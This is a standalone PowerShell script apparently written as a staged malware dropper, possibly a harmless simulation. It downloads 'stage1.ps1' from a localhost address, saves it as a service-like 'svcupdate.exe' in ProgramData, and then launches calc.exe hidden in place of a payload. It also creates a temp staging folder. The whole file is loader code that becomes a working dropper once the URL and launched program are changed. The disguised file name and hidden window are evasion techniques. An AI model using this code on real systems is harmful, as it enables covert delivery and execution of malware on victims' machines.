[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://localhost:8080/stage1.ps1',
    [string]$DropPath = 'C:\ProgramData\svcupdate.exe',
    [int]$RequestTimeout = 48
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $StageResult = Invoke-Stage1Download -SourceUrl $Stage1Url -DestinationPath $DropPath -TimeoutSec $RequestTimeout
    if ($StageResult) {
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Write-Verbose "stage marker 39 reached"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
